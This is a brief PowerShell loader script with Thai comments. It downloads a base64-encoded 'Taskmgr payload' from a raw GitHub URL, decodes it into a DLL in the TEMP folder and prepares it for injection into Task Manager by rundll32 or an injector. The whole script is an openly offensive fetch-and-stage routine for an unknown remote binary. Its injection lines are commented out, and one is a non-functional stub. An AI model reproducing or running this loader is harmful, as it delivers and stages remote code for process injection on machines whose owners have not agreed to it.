# load.ps1
$url = "https://raw.githubusercontent.com/puddyeieiei/dydestiny/main/taskmgr.b64"

Write-Host "[*] Downloading Taskmgr payload from GitHub..." -ForegroundColor Cyan

try {
    $base64 = (iwr -UseBasicParsing $url).Content
    $bytes = [Convert]::FromBase64String($base64)
    
    # เขียน DLL ชั่วคราว
    $dllPath = "$env:TEMP\Taskmgr.dll"
    [IO.File]::WriteAllBytes($dllPath, $bytes)
    
    Write-Host "[*] Loading Taskmgr.dll into memory..." -ForegroundColor Cyan
    
    # ใช้ rundll32 หรือ reflective load
    # วิธีที่ 1: ใช้ rundll32 (ต้องมี exported function)
    # rundll32.exe $dllPath, #ชื่อฟังก์ชัน
    
    # วิธีที่ 2: ใช้ LoadLibrary (ต้องมี injector)
    # $handle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length), [Type]([System.Action]))
    
    Write-Host "[+] Taskmgr.dll is ready!" -ForegroundColor Green
    Write-Host "[*] Note: You need an injector to load this DLL into Task Manager" -ForegroundColor Yellow
}
catch {
    Write-Host "[-] Failed: $_" -ForegroundColor Red
}
